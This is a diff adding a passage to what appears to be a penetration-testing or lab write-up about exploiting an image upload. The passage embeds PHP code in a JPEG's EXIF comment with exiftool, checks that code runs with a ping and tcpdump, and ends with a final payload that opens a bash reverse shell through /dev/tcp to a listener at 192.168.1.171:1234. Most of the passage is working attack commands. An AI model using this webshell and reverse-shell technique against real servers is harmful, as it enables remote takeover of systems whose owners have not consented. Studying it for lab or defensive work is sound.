@@ -1,0 +1,26 @@
+### `tcpdump` ping test
+
+In order to ensure that code execution works I put `ping` as payload in a legitimate image:
+
+```bash
+$ exiftool -Comment='<?php echo "<pre>"; system("ping -c1 192.168.1.171"); ?>' avatar.jpg
+```
+
+And it worked (`tcpdump` as proof):
+
+```bash
+$ tcpdump -i eth0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+23:16:39.978437 IP node-81s.pool-1-1.dynamic.totinternet.net > all-systems.mcast.net: ICMP router advertisement lifetime 22:30 1: {Docsis-Gateway 0}, length 16
+^C
+1 packet captured
+1 packet received by filter
+0 packets dropped by kernel
+```
+
+### Final payload
+
+```bash
+$ exiftool -Comment="<?php system('bash -c \"bash -i >& /dev/tcp/192.168.1.171/1234 0>&1\"'); ?>" bim.jpg
+```
